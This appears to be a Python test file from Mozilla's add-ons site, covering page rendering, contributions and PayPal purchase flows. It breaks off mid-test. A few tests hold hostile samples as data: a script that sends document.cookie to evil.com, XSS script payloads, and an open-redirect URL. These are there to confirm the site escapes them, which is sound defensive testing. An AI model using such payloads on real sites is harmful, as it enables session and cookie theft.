# -*- coding: utf-8 -*-
from cStringIO import StringIO
from datetime import datetime
from decimal import Decimal
import json
import os
import re

from django import test
from django.conf import settings
from django.core import mail
from django.core.cache import cache
from django.utils.encoding import iri_to_uri

from mock import patch
from nose.tools import eq_, nottest
from nose import SkipTest
from pyquery import PyQuery as pq
from PIL import Image
import waffle

import amo
import amo.tests
from amo.helpers import absolutify, numberfmt, urlparams, shared_url
from amo.tests import addon_factory
from amo.tests.test_helpers import get_image_path
from amo.urlresolvers import reverse
from abuse.models import AbuseReport
from addons import cron
from addons.models import (Addon, AddonDependency, AddonUpsell, AddonUser,
                           Charity, Category)
from files.models import File
from market.models import AddonPremium, AddonPurchase, Price
from paypal.tests import other_error
from stats.models import Contribution
from translations.helpers import truncate
from users.helpers import users_list
from users.models import UserProfile
from versions.models import License, Version


def norm(s):
    """Normalize a string so that whitespace is uniform."""
    return re.sub(r'[\s]+', ' ', str(s)).strip()


def add_addon_author(original, copy):
    """Make both add-ons share an author."""
    author = original.listed_authors[0]
    AddonUser.objects.create(addon=copy, user=author, listed=True)
    return author


@nottest
def test_hovercards(self, doc, addons, src=''):
    addons = list(addons)
    eq_(doc.find('.addon.hovercard').length, len(addons))
    for addon in addons:
        btn = doc.find('.install[data-addon=%s]' % addon.id)
        eq_(btn.length, 1)
        hc = btn.parents('.addon.hovercard')
        eq_(hc.children('a').attr('href'),
            urlparams(addon.get_url_path(), src=src))
        eq_(hc.find('h3').text(), unicode(addon.name))


class TestHomepage(amo.tests.TestCase):
    fixtures = ['base/apps',
                'base/users',
                'base/addon_3615',
                'base/collections',
                'base/global-stats',
                'base/featured',
                'base/collections',
                'addons/featured',
                'bandwagon/featured_collections']

    def setUp(self):
        super(TestHomepage, self).setUp()
        self.base_url = reverse('home')

    def test_thunderbird(self):
        """Thunderbird homepage should have the Thunderbird title."""
        r = self.client.get('/en-US/thunderbird/')
        doc = pq(r.content)
        eq_('Add-ons for Thunderbird', doc('title').text())

    def test_welcome_msg(self):
        r = self.client.get('/en-US/firefox/')
        welcome = pq(r.content)('#site-welcome').remove('a.close')
        eq_(welcome.text(),
            'Welcome to Firefox Add-ons. Choose from thousands of extra '
            'features and styles to make Firefox your own.')
        r = self.client.get('/en-US/thunderbird/')
        welcome = pq(r.content)('#site-welcome').remove('a.close')
        eq_(welcome.text(),
            'Welcome to Thunderbird Add-ons. Add extra features and styles to '
            'make Thunderbird your own.')

    def test_no_unreviewed(self):
        response = self.client.get(self.base_url)
        addon_lists = 'popular featured hotness personas'.split()
        for key in addon_lists:
            for addon in response.context[key]:
                assert addon.status != amo.STATUS_UNREVIEWED


class TestPromobox(amo.tests.TestCase):
    fixtures = ['addons/ptbr-promobox']

    def test_promo_box_ptbr(self):
        # bug 564355, we were trying to match pt-BR and pt-br
        response = self.client.get('/pt-BR/firefox/', follow=True)
        eq_(response.status_code, 200)


class TestContributeInstalled(amo.tests.TestCase):
    fixtures = ['base/apps', 'base/addon_592']

    def setUp(self):
        self.addon = Addon.objects.get(pk=592)
        self.url = reverse('addons.installed', args=['a592'])

    def test_no_header_block(self):
        # bug 565493, Port post-install contributions page
        response = self.client.get(self.url, follow=True)
        doc = pq(response.content)
        header = doc('#header')
        aux_header = doc('#aux-nav')
        # assert that header and aux_header are empty (don't exist)
        eq_(header, [])
        eq_(aux_header, [])

    def test_num_addons_link(self):
        r = self.client.get(self.url)
        a = pq(r.content)('.num-addons a')
        eq_(a.length, 1)
        author = self.addon.authors.all()[0]
        eq_(a.attr('href'), reverse('users.profile', args=[author.id]))

    def test_title(self):
        r = self.client.get(self.url)
        title = pq(r.content)('title').text()
        eq_(title.startswith('Thank you for installing Gmail S/MIME'), True)


class TestContributeEmbedded(amo.tests.TestCase):
    fixtures = ['base/apps', 'base/addon_3615', 'base/addon_592']

    def setUp(self):
        self.addon = Addon.objects.get(pk=592)
        self.detail_url = reverse('addons.detail', args=[self.addon.slug])

    @patch('paypal.get_paykey')
    def client_get(self, get_paykey, **kwargs):
        get_paykey.return_value = 'abc'
        url = reverse('addons.contribute', args=kwargs.pop('rev'))
        if 'qs' in kwargs:
            url = url + kwargs.pop('qs')
        return self.client.get(url, kwargs.get('data', {}))

    def test_invalid_is_404(self):
        """we get a 404 in case of invalid addon id"""
        response = self.client_get(rev=[1])
        eq_(response.status_code, 404)

    @patch('paypal.get_paykey')
    def test_charity_name(self, get_paykey):
        self.addon.charity = Charity.objects.create(name='foo')
        self.addon.save()
        url = reverse('addons.contribute', args=['a592'])
        self.client.get(url)
        eq_(get_paykey.call_args[0][0]['memo'],
            u'Contribution for Gmail S/MIME: foo')

    def test_params_common(self):
        """Test for the some of the common values"""
        response = self.client_get(rev=['a592'])
        eq_(response.status_code, 302)
        con = Contribution.objects.all()[0]
        eq_(con.charity_id, None)
        eq_(con.addon_id, 592)
        eq_(con.amount, Decimal('20.00'))

    def test_custom_amount(self):
        """Test that we have the custom amount when given."""
        request_params = '?type=onetime&onetime-amount=42'
        response = self.client_get(rev=['a592'], qs=request_params)
        eq_(response.status_code, 302)
        eq_(Contribution.objects.all()[0].amount, Decimal('42.00'))

    def test_ppal_json_switch(self):
        response = self.client_get(rev=['a592'], qs='?result_type=json')
        eq_(response.status_code, 200)
        response = self.client_get(rev=['a592'])
        eq_(response.status_code, 302)

    def test_ppal_return_url_not_relative(self):
        response = self.client_get(rev=['a592'], qs='?result_type=json')
        assert json.loads(response.content)['url'].startswith('http')

    def test_unicode_comment(self):
        res = self.client_get(rev=['a592'],
                            data={'comment': u'版本历史记录'})
        eq_(res.status_code, 302)
        assert settings.PAYPAL_FLOW_URL in res._headers['location'][1]
        eq_(Contribution.objects.all()[0].comment, u'版本历史记录')

    def test_organization(self):
        c = Charity.objects.create(name='moz', url='moz.com',
                                   paypal='test@moz.com')
        self.addon.update(charity=c)

        r = self.client_get(rev=['a592'])
        eq_(r.status_code, 302)
        eq_(self.addon.charity_id,
            self.addon.contribution_set.all()[0].charity_id)

    def test_no_org(self):
        r = self.client_get(rev=['a592'])
        eq_(r.status_code, 302)
        eq_(self.addon.contribution_set.all()[0].charity_id, None)

    def test_no_suggested_amount(self):
        self.addon.update(suggested_amount=None)
        res = self.client_get(rev=['a592'])
        eq_(res.status_code, 302)
        eq_(settings.DEFAULT_SUGGESTED_CONTRIBUTION,
            self.addon.contribution_set.all()[0].amount)

    def test_form_suggested_amount(self):
        res = self.client.get(self.detail_url)
        doc = pq(res.content)
        eq_(len(doc('#contribute-box input')), 4)

    def test_form_no_suggested_amount(self):
        self.addon.update(suggested_amount=None)
        res = self.client.get(self.detail_url)
        doc = pq(res.content)
        eq_(len(doc('#contribute-box input')), 3)

    @patch('paypal.get_paykey')
    def test_paypal_error_json(self, get_paykey, **kwargs):
        get_paykey.return_value = None
        res = self.client.get('%s?%s' % (
                        reverse('addons.contribute', args=[self.addon.slug]),
                        'result_type=json'))
        assert not json.loads(res.content)['paykey']

    @patch('urllib2.OpenerDirector.open')
    def test_paypal_other_error_json(self, opener, **kwargs):
        opener.return_value = StringIO(other_error)
        res = self.client.get('%s?%s' % (
                        reverse('addons.contribute', args=[self.addon.slug]),
                        'result_type=json'))
        assert not json.loads(res.content)['paykey']

    def test_result_page(self):
        url = reverse('addons.paypal', args=[self.addon.slug, 'complete'])
        doc = pq(self.client.get(url).content)
        eq_(len(doc('#paypal-thanks')), 0)

    @patch('paypal.get_paykey')
    def test_not_split(self, get_paykey):
        get_paykey.return_value = None
        self.client.get('%s?%s' % (
                        reverse('addons.contribute', args=[self.addon.slug]),
                        'result_type=json'))
        assert 'chains' not in get_paykey.call_args_list[0][0][0].keys()


class TestPurchaseEmbedded(amo.tests.TestCase):
    fixtures = ['base/apps', 'base/addon_592', 'base/users', 'prices']

    def setUp(self):
        waffle.models.Switch.objects.create(name='marketplace', active=True)
        self.addon = Addon.objects.get(pk=592)
        self.addon.update(premium_type=amo.ADDON_PREMIUM,
                          status=amo.STATUS_PUBLIC)
        self.file = File.objects.get(pk=87384)
        self.user = UserProfile.objects.get(email='regular@mozilla.com')
        AddonPremium.objects.create(addon=self.addon, price_id=1)
        self.purchase_url = reverse('addons.purchase', args=[self.addon.slug])
        self.client.login(username='regular@mozilla.com', password='password')

    def test_premium_only(self):
        self.addon.update(premium_type=amo.ADDON_FREE)
        eq_(self.client.get(self.purchase_url).status_code, 403)

    @patch('paypal.get_paykey')
    def test_redirect(self, get_paykey):
        get_paykey.return_value = 'some-pay-key'
        res = self.client.get(self.purchase_url)
        assert 'some-pay-key' in res['Location']

    @patch('paypal.get_paykey')
    def test_ajax(self, get_paykey):
        get_paykey.return_value = 'some-pay-key'
        res = self.client.get_ajax(self.purchase_url)
        assert json.loads(res.content)['paykey'] == 'some-pay-key'

    @patch('paypal.get_paykey')
    def test_paykey_amount(self, get_paykey):
        # Test the amount the paykey for is the price.
        get_paykey.return_value = 'some-pay-key'
        self.client.get_ajax(self.purchase_url)
        # wtf? Can we get any more [0]'s there?
        eq_(get_paykey.call_args_list[0][0][0]['amount'], Decimal('0.99'))

    @patch('paypal.get_paykey')
    def test_paykey_error(self, get_paykey):
        get_paykey.side_effect = Exception('woah')
        res = self.client.get_ajax(self.purchase_url)
        assert json.loads(res.content)['error'].startswith('There was an')

    @patch('paypal.get_paykey')
    def test_paykey_contribution(self, get_paykey):
        get_paykey.return_value = 'some-pay-key'
        self.client.get_ajax(self.purchase_url)
        cons = Contribution.objects.filter(type=amo.CONTRIB_PENDING)
        eq_(cons.count(), 1)
        eq_(cons[0].amount, Decimal('0.99'))

    def make_contribution(self, type=amo.CONTRIB_PENDING):
        return Contribution.objects.create(type=type,
                                           uuid='123', addon=self.addon,
                                           paykey='1234', user=self.user)

    def get_url(self, status):
        return reverse('addons.purchase.finished',
                       args=[self.addon.slug, status])

    @patch('paypal.check_purchase')
    def test_check_purchase(self, check_purchase):
        check_purchase.return_value = 'COMPLETED'
        self.make_contribution()
        self.client.get_ajax('%s?uuid=%s' % (self.get_url('complete'), '123'))
        cons = Contribution.objects.all()
        eq_(cons.count(), 1)
        eq_(cons[0].type, amo.CONTRIB_PURCHASE)
        eq_(cons[0].uuid, None)

    @patch('paypal.check_purchase')
    def test_check_addon_purchase(self, check_purchase):
        check_purchase.return_value = 'COMPLETED'
        self.make_contribution()
        res = self.client.get_ajax('%s?uuid=%s' %
                                   (self.get_url('complete'), '123'))
        eq_(AddonPurchase.objects.filter(addon=self.addon).count(), 1)
        eq_(res.context['status'], 'complete')

    def test_check_cancel(self):
        self.make_contribution()
        res = self.client.get_ajax('%s?uuid=%s' %
                                   (self.get_url('cancel'), '123'))
        eq_(Contribution.objects.filter(type=amo.CONTRIB_PURCHASE).count(), 0)
        eq_(res.context['status'], 'cancel')

    @patch('paypal.check_purchase')
    def test_check_wrong_uuid(self, check_purchase):
        check_purchase.return_value = 'COMPLETED'
        self.make_contribution()
        self.assertRaises(Contribution.DoesNotExist,
                          self.client.get_ajax,
                          '%s?uuid=%s' % (self.get_url('complete'), 'foo'))

    @patch('paypal.check_purchase')
    def test_check_pending(self, check_purchase):
        check_purchase.return_value = 'PENDING'
        self.make_contribution()
        self.client.get_ajax('%s?uuid=%s' % (self.get_url('complete'), '123'))
        eq_(Contribution.objects.filter(type=amo.CONTRIB_PURCHASE).count(), 0)

    @patch('paypal.check_purchase')
    def test_check_pending_error(self, check_purchase):
        check_purchase.side_effect = Exception('wtf')
        self.make_contribution()
        url = '%s?uuid=%s' % (self.get_url('complete'), '123')
        res = self.client.get_ajax(url)
        eq_(res.context['result'], 'ERROR')

    def test_check_thankyou(self):
        url = reverse('addons.purchase.thanks', args=[self.addon.slug])
        eq_(self.client.get(url).status_code, 403)
        self.make_contribution(type=amo.CONTRIB_PURCHASE)
        eq_(self.client.get(url).status_code, 200)

    def test_trigger(self):
        url = reverse('addons.purchase.thanks', args=[self.addon.slug])
        self.make_contribution(type=amo.CONTRIB_PURCHASE)
        dest = reverse('downloads.watermarked', args=[self.file.pk])
        res = self.client.get('%s?realurl=%s' % (url, dest))
        eq_(res.status_code, 200)
        eq_(pq(res.content)('a.trigger_download').attr('href'), dest)

    def test_trigger_nasty(self):
        url = reverse('addons.purchase.thanks', args=[self.addon.slug])
        self.make_contribution(type=amo.CONTRIB_PURCHASE)
        res = self.client.get('%s?realurl=%s' % (url, 'http://bad.site/foo'))
        eq_(res.status_code, 200)
        eq_(pq(res.content)('a.trigger_download').attr('href'), '/foo')

    @patch('paypal.check_purchase')
    def test_result_page(self, check_purchase):
        check_purchase.return_value = 'COMPLETED'
        Contribution.objects.create(addon=self.addon, uuid='1',
                                    user=self.user, paykey='sdf',
                                    type=amo.CONTRIB_PENDING)
        url = reverse('addons.purchase.finished',
                      args=[self.addon.slug, 'complete'])
        doc = pq(self.client.get('%s?uuid=1' % url).content)
        eq_(len(doc('#paypal-thanks')), 1)

    def test_trigger_webapp(self):
        url = reverse('addons.purchase.thanks', args=[self.addon.slug])
        self.make_contribution(type=amo.CONTRIB_PURCHASE)
        self.addon.update(type=amo.ADDON_WEBAPP, manifest_url='http://f.com')
        doc = pq(self.client.get(url).content)
        eq_(doc('.trigger_app_install').attr('data-manifest-url'),
            self.addon.manifest_url)

    @patch('paypal.get_paykey')
    def test_split(self, get_paykey):
        get_paykey.return_value = None
        self.client.get('%s?%s' % (
                        reverse('addons.purchase', args=[self.addon.slug]),
                        'result_type=json'))
        assert 'chains' in get_paykey.call_args_list[0][0][0].keys()


def setup_premium(addon):
    price = Price.objects.create(price='0.99')
    AddonPremium.objects.create(addon=addon, price=price)
    addon.update(premium_type=amo.ADDON_PREMIUM)
    return addon, price


# TODO: remove when the marketplace is live.
@patch.object(waffle, 'switch_is_active', lambda x: True)
# TODO: figure out why this is being set
@patch.object(settings, 'LOGIN_RATELIMIT_USER', 10)
class TestPaypalStart(amo.tests.TestCase):
    fixtures = ['users/test_backends', 'base/addon_3615']

    def get_profile(self):
        return UserProfile.objects.get(id=4043307)

    def setUp(self):
        self.client.get('/')
        self.data = {'username': 'jbalogh@mozilla.com',
                     'password': 'foo'}
        self.addon = Addon.objects.all()[0]
        self.url = shared_url('addons.purchase.start', self.addon)
        self.addon, self.price = setup_premium(self.addon)

    def test_loggedout_purchased(self):
        # "Buy" the add-on
        self.addon.addonpurchase_set.create(user=self.get_profile())

        # Make sure we get a log in field
        r = self.client.get_ajax(self.url)
        eq_(r.status_code, 200)
        assert pq(r.content).find('#id_username').length

        # Now, let's log in.
        res = self.client.post_ajax(self.url, data=self.data)
        eq_(res.status_code, 200)

        # Are we presented with a link to the download?
        assert pq(res.content).find('.trigger_download').length

    def test_loggedin_purchased(self):
        # Log the user in
        assert self.client.login(**self.data)

        # "Buy" the add-on
        self.addon.addonpurchase_set.create(user=self.get_profile())

        r = self.client.get_ajax(self.url)
        eq_(r.status_code, 200)

        # This only happens if we've bought it.
        assert pq(r.content).find('.trigger_download').length

    def test_loggedout_notpurchased(self):
        # We don't want any purchases.
        AddonPurchase.objects.all().delete()

        # Make sure we're presented with a log in form.
        r = self.client.get_ajax(self.url)
        eq_(r.status_code, 200)
        assert pq(r.content).find('#id_username').length

        # Now, let's log in.
        res = self.client.post_ajax(self.url, data=self.data)
        eq_(res.status_code, 200)

        # Make sure we get a link to paypal
        assert pq(res.content).find('.paypal.button').length

    def test_loggedin_notpurchased(self):
        # No purchases; logged in.
        AddonPurchase.objects.all().delete()
        assert self.client.login(**self.data)

        r = self.client.get_ajax(self.url)
        eq_(r.status_code, 200)

        # Make sure we get a link to paypal.
        assert pq(r.content).find('.paypal.button').length


class TestDeveloperPages(amo.tests.TestCase):
    fixtures = ['base/apps', 'base/addon_3615', 'base/addon_592',
                'base/users', 'addons/eula+contrib-addon',
                'addons/addon_228106_info+dev+bio.json',
                'addons/addon_228107_multiple-devs.json']

    def test_meet_the_dev_title(self):
        r = self.client.get(reverse('addons.meet', args=['a592']))
        title = pq(r.content)('title').text()
        eq_(title.startswith('Meet the Gmail S/MIME Developer'), True)

    def test_roadblock_title(self):
        r = self.client.get(reverse('addons.meet', args=['a592']))
        title = pq(r.content)('title').text()
        eq_(title.startswith('Meet the Gmail S/MIME Developer'), True)

    def test_meet_the_dev_src(self):
        r = self.client.get(reverse('addons.meet', args=['a11730']))
        button = pq(r.content)('.install-button a.button').attr('href')
        eq_(button.endswith('?src=developers'), True)

    def test_nl2br_info(self):
        r = self.client.get(reverse('addons.meet', args=['a228106']))
        eq_(r.status_code, 200)
        doc = pq(r.content)
        eq_(doc('.bio').html(),
            'Bio: This is line one.<br/><br/>This is line two')
        addon_reasons = doc('#about-addon p')
        eq_(addon_reasons.eq(0).html(),
            'Why: This is line one.<br/><br/>This is line two')
        eq_(addon_reasons.eq(1).html(),
            'Future: This is line one.<br/><br/>This is line two')

    def test_nl2br_info_for_multiple_devs(self):
        # Get an Add-on that has multiple developers,
        # which will trigger the else block in the template.
        r = self.client.get(reverse('addons.meet', args=['a228107']))
        eq_(r.status_code, 200)
        bios = pq(r.content)('.bio')
        eq_(bios.eq(0).html(),
            'Bio1: This is line one.<br/><br/>This is line two')
        eq_(bios.eq(1).html(),
            'Bio2: This is line one.<br/><br/>This is line two')

    def test_roadblock_src(self):
        url = reverse('addons.roadblock', args=['a11730'])
        # If they end up at the roadblock we force roadblock on them
        r = self.client.get(url + '?src=dp-btn-primary')
        button = pq(r.content)('.install-button a.button').attr('href')
        eq_(button.endswith('?src=dp-btn-primary'), True)

        # No previous source gets the roadblock page source
        r = self.client.get(url)
        button = pq(r.content)('.install-button a.button').attr('href')
        eq_(button.endswith('?src=meetthedeveloper_roadblock'), True)

    def test_roadblock_different(self):
        url = reverse('addons.roadblock', args=['a11730'])
        r = self.client.get(url + '?src=dp-btn-primary')
        button = pq(r.content)('.install-button a.button').attr('href')
        eq_(button.endswith('?src=dp-btn-primary'), True)

        contribute = pq(r.content)('#contribute-button').attr('href')
        eq_(contribute.endswith('?src=roadblock'), True)

    def test_contribute_multiple_devs(self):
        a = Addon.objects.get(pk=592)
        u = UserProfile.objects.get(pk=999)
        AddonUser(addon=a, user=u).save()
        r = self.client.get(reverse('addons.meet', args=['a592']))
        eq_(pq(r.content)('#contribute-button').length, 1)

    def test_get_old_version(self):
        url = reverse('addons.meet', args=['a11730'])
        r = self.client.get(url)
        eq_(r.context['version'].version, '20090521')

        r = self.client.get('%s?version=%s' % (url, '20080521'))
        eq_(r.context['version'].version, '20080521')

    def test_duplicate_version_number(self):
        qs = Version.objects.filter(addon=11730)
        qs.update(version='1.x')
        eq_(qs.count(), 2)
        url = reverse('addons.meet', args=['a11730']) + '?version=1.x'
        r = self.client.get(url)
        eq_(r.context['version'].version, '1.x')

    def test_purified(self):
        addon = Addon.objects.get(pk=592)
        addon.the_reason = addon.the_future = '<b>foo</b>'
        addon.save()
        url = reverse('addons.meet', args=['592'])
        r = self.client.get(url, follow=True)
        eq_(pq(r.content)('#about-addon b').length, 2)


class TestLicensePage(amo.tests.TestCase):
    fixtures = ['base/apps', 'base/addon_3615']

    def setUp(self):
        self.addon = Addon.objects.get(id=3615)
        self.version = self.addon.current_version

    def test_legacy_redirect(self):
        r = self.client.get('/versions/license/%s' % self.version.id,
                            follow=True)
        self.assertRedirects(r, self.version.license_url(), 301)

    def test_explicit_version(self):
        url = reverse('addons.license', args=['a3615', self.version.version])
        r = self.client.get(url)
        eq_(r.status_code, 200)
        eq_(r.context['version'], self.version)

    def test_implicit_version(self):
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
        eq_(r.status_code, 200)
        eq_(r.context['version'], self.addon.current_version)

    def test_no_license(self):
        self.version.update(license=None)
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
        eq_(r.status_code, 404)

    def test_no_version(self):
        self.addon.versions.all().delete()
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
        eq_(r.status_code, 404)

    def test_duplicate_version_number(self):
        Version.objects.create(addon=self.addon, version=self.version.version)
        url = reverse('addons.license', args=['a3615', self.version.version])
        r = self.client.get(url)
        eq_(r.status_code, 200)
        eq_(r.context['version'], self.addon.current_version)


class TestDetailPage(amo.tests.TestCase):
    fixtures = ['base/apps',
                'base/addon_3615',
                'base/users',
                'base/addon_59',
                'base/addon_4594_a9',
                'addons/listed',
                'addons/persona']

    def setUp(self):
        self.addon = Addon.objects.get(id=3615)
        self.url = self.addon.get_url_path()

    def test_site_title(self):
        r = self.client.get(self.url)
        eq_(pq(r.content)('h1.site-title').text(), 'Add-ons')

    def test_addon_headings(self):
        r = self.client.get(self.url)
        doc = pq(r.content)
        eq_(doc('h2:first').text(), 'About this Add-on')
        eq_(doc('.metadata .home').text(), 'Add-on home page')

    def test_anonymous_extension(self):
        response = self.client.get(reverse('addons.detail', args=['a3615']),
                                   follow=True)
        eq_(response.status_code, 200)
        eq_(response.context['addon'].id, 3615)

    def test_anonymous_persona(self):
        response = self.client.get(reverse('addons.detail', args=['a15663']),
                                   follow=True)
        eq_(response.status_code, 200)
        eq_(response.context['addon'].id, 15663)

    def test_review_microdata_personas(self):
        a = Addon.objects.get(id=15663)
        a.name = '<script>alert("fff")</script>'
        a.save()
        response = self.client.get(reverse('addons.detail', args=['a15663']))
        html = pq(response.content)('table caption').html()
        assert '&lt;script&gt;alert("fff")&lt;/script&gt;' in html
        assert '<script>' not in html

    def test_personas_context(self):
        response = self.client.get(reverse('addons.detail', args=['a15663']))
        assert 'review_form' in response.context
        assert 'reviews' in response.context
        assert 'get_replies' in response.context

    def test_unreviewed_robots(self):
        """Check that unreviewed add-ons do not get indexed."""
        addon = Addon.objects.get(id=3615)
        url = reverse('addons.detail', args=['a3615'])
        m = 'meta[content=noindex]'

        eq_(addon.status, amo.STATUS_PUBLIC)
        settings.ENGAGE_ROBOTS = True
        doc = pq(self.client.get(url).content)
        assert not doc(m)
        settings.ENGAGE_ROBOTS = False
        doc = pq(self.client.get(url).content)
        assert doc(m)

        addon.update(status=amo.STATUS_UNREVIEWED)
        settings.ENGAGE_ROBOTS = False
        doc = pq(self.client.get(url).content)
        assert doc(m)
        settings.ENGAGE_ROBOTS = True
        doc = pq(self.client.get(url).content)
        assert doc(m)

    def test_more_about(self):
        # Don't show more about box if there's nothing to populate it.
        addon = Addon.objects.get(id=3615)
        addon.developer_comments_id = None
        addon.description_id = None
        addon.previews.all().delete()
        addon.save()

        r = self.client.get(reverse('addons.detail', args=['a3615']))
        doc = pq(r.content)

        eq_(doc('#more-about').length, 0)
        eq_(doc('.article.userinput').length, 0)

    def test_beta(self):
        """Test add-on with a beta channel."""
        my_addonid = 3615
        get_pq_content = lambda: pq(self.client.get(reverse(
            'addons.detail', args=[my_addonid]), follow=True).content)

        myaddon = Addon.objects.get(id=my_addonid)

        # Add a beta version and show it.
        mybetafile = myaddon.versions.all()[0].files.all()[0]
        mybetafile.status = amo.STATUS_BETA
        mybetafile.save()
        myaddon.update(status=amo.STATUS_PUBLIC)
        beta = get_pq_content()
        eq_(beta('#beta-channel').length, 1)

        # Now hide it.  Beta is only shown for STATUS_PUBLIC.
        myaddon.update(status=amo.STATUS_UNREVIEWED)
        beta = get_pq_content()
        eq_(beta('#beta-channel').length, 0)

    def test_type_redirect(self):
        """
        If current add-on's type is unsupported by app, redirect to an
        app that supports it.
        """
        # Sunbird can't do Personas => redirect
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = amo.SUNBIRD.short
        response = self.client.get(reverse('addons.detail', args=['a15663']),
                                   follow=False)
        eq_(response.status_code, 301)
        eq_(response['Location'].find(amo.SUNBIRD.short), -1)
        assert (response['Location'].find(amo.FIREFOX.short) >= 0)

    def test_compatible_app_redirect(self):
        """
        For add-ons incompatible with the current app, redirect to one
        that's supported.
        """
        addon = Addon.objects.get(id=3615)
        comp_app = addon.compatible_apps.keys()[0]
        not_comp_app = [a for a in amo.APP_USAGE
                        if a not in addon.compatible_apps.keys()][0]

        # no SeaMonkey version => redirect
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = not_comp_app.short
        response = self.client.get(reverse('addons.detail', args=[addon.slug]),
                                   follow=False)
        eq_(response.status_code, 301)
        eq_(response['Location'].find(not_comp_app.short), -1)
        assert (response['Location'].find(comp_app.short) >= 0)

        # compatible app => 200
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = comp_app.short
        response = self.client.get(reverse('addons.detail', args=[addon.slug]),
                                   follow=False)
        eq_(response.status_code, 200)

    def test_external_urls(self):
        """Check that external URLs are properly escaped."""
        addon = Addon.objects.get(id=3615)
        response = self.client.get(reverse('addons.detail', args=[addon.slug]),
                                   follow=True)
        doc = pq(response.content)
        eq_(doc('aside a.home[href^="%s"]' %
                settings.REDIRECT_URL).length, 1)

    def test_no_privacy_policy(self):
        """Make sure privacy policy is not shown when not present."""
        addon = Addon.objects.get(id=3615)
        addon.privacy_policy_id = None
        addon.save()
        response = self.client.get(reverse('addons.detail', args=[addon.slug]),
                                   follow=True)
        doc = pq(response.content)
        eq_(doc('.privacy-policy').length, 0)

    def test_privacy_policy(self):
        addon = Addon.objects.get(id=3615)
        addon.privacy_policy = 'foo bar'
        addon.save()
        response = self.client.get(reverse('addons.detail', args=[addon.slug]),
                                   follow=True)
        doc = pq(response.content)
        eq_(doc('.privacy-policy').length, 1)
        privacy_url = reverse('addons.privacy', args=[addon.slug])
        assert doc('.privacy-policy').attr('href').endswith(privacy_url)

    def test_simple_html_is_rendered_in_privacy(self):
        addon = Addon.objects.get(id=3615)
        addon.privacy_policy = """
            <strong> what the hell..</strong>
            <ul>
                <li>papparapara</li>
                <li>todotodotodo</li>
            </ul>
            <ol>
                <a href="irc://irc.mozilla.org/firefox">firefox</a>

                Introduce yourself to the community, if you like!
                This text will appear publicly on your user info page.
                <li>papparapara2</li>
                <li>todotodotodo2</li>
            </ol>
            """
        addon.save()

        r = self.client.get(reverse('addons.privacy', args=[addon.slug]))
        doc = pq(r.content)

        eq_(norm(doc(".policy-statement strong")),
            "<strong> what the hell..</strong>")
        eq_(norm(doc(".policy-statement ul")),
            "<ul><li>papparapara</li> <li>todotodotodo</li> </ul>")
        eq_(doc(".policy-statement ol a").text(),
            "firefox")
        eq_(norm(doc(".policy-statement ol li:first")),
            "<li>papparapara2</li>")

    def test_evil_html_is_not_rendered_in_privacy(self):
        addon = Addon.objects.get(id=3615)
        addon.privacy_policy = """
            <script type="text/javascript">
                window.location = 'http://evil.com/?c=' + document.cookie;
            </script>
            Muhuhahahahahahaha!
            """
        addon.save()

        r = self.client.get(reverse('addons.privacy', args=[addon.slug]))
        doc = pq(r.content)

        policy = str(doc(".policy-statement"))
        assert policy.startswith(
                    '<div class="policy-statement">&lt;script'), (
                                            'Unexpected: %s' % policy[0:50])

    def test_button_size(self):
        """Make sure install buttons on the detail page are prominent."""
        response = self.client.get(reverse('addons.detail', args=['a3615']),
                                   follow=True)
        assert pq(response.content)('.button').hasClass('prominent')

    def test_button_src_default(self):
        r = self.client.get(self.url, follow=True)
        eq_((pq(r.content)('#addon .button').attr('href')
             .endswith('?src=dp-btn-primary')), True)

    def test_button_src_trickle(self):
        r = self.client.get(self.url + '?src=trickleortreat', follow=True)
        eq_((pq(r.content)('#addon .button').attr('href')
             .endswith('?src=trickleortreat')), True)

    def test_version_button_src_default(self):
        r = self.client.get(self.url, follow=True)
        eq_((pq(r.content)('#detail-relnotes .button').attr('href')
             .endswith('?src=dp-btn-version')), True)

    def test_version_button_src_trickle(self):
        r = self.client.get(self.url + '?src=trickleortreat', follow=True)
        eq_((pq(r.content)('#detail-relnotes .button').attr('href')
             .endswith('?src=trickleortreat')), True)

    def test_invalid_version(self):
        """Only render details pages for add-ons that have a version."""
        myaddon = Addon.objects.get(id=3615)
        # wipe all versions
        myaddon.versions.all().delete()
        # try accessing the details page
        response = self.client.get(reverse('addons.detail',
                                           args=[myaddon.slug]),
                                   follow=True)
        eq_(response.status_code, 404)

    def test_detailed_review_link(self):
        self.client.login(username='regular@mozilla.com', password='password')
        r = self.client.get(reverse('addons.detail', args=['a3615']))
        doc = pq(r.content)
        href = doc('#review-box a[href*="reviews/add"]').attr('href')
        assert href.endswith(reverse('addons.reviews.add', args=['a3615'])), (
            href)

    def test_no_listed_authors(self):
        r = self.client.get(reverse('addons.detail', args=['a59']))
        # We shouldn't show an avatar since this has no listed_authors.
        doc = pq(r.content)
        eq_(0, len(doc('.avatar')))

    def test_authors_xss(self):
        name = '<script>alert(1)</script>'
        user = UserProfile.objects.create(username='test',
                                          display_name=name)

        output = users_list([user])

        assert "&lt;script&gt;alert" in output
        assert "<script>alert" not in output

    def test_display_compatible_apps(self):
        """Show compatiblity info for extensions but not for search engines."""
        r = self.client.get(self.addon.get_url_path())
        eq_(pq(r.content)('#detail-relnotes .compat').length, 1)

        a = Addon.objects.filter(type=amo.ADDON_SEARCH)[0]
        r = self.client.get(a.get_url_path())
        eq_(pq(r.content)('#detail-relnotes .compat').length, 0)

    def test_show_profile(self):
        addon = Addon.objects.get(id=3615)
        url = reverse('addons.detail', args=[addon.slug])
        selector = '.author a[href="%s"]' % addon.meet_the_dev_url()

        assert not (addon.the_reason or addon.the_future)
        assert not pq(self.client.get(url).content)(selector)

        addon.the_reason = addon.the_future = '...'
        addon.save()
        assert pq(self.client.get(url).content)(selector)

    def test_no_restart(self):
        no_restart = '<span class="no-restart">No Restart</span>'
        addon = Addon.objects.get(id=3615)
        url = reverse('addons.detail', args=[addon.slug])
        f = addon.current_version.all_files[0]

        assert f.no_restart == False
        r = self.client.get(url)
        assert no_restart not in r.content

        f.no_restart = True
        f.save()
        r = self.client.get(url)
        self.assertContains(r, no_restart)

    def test_no_backup(self):
        addon = Addon.objects.get(id=3615)
        url = reverse('addons.detail', args=[addon.slug])
        res = self.client.get(url)
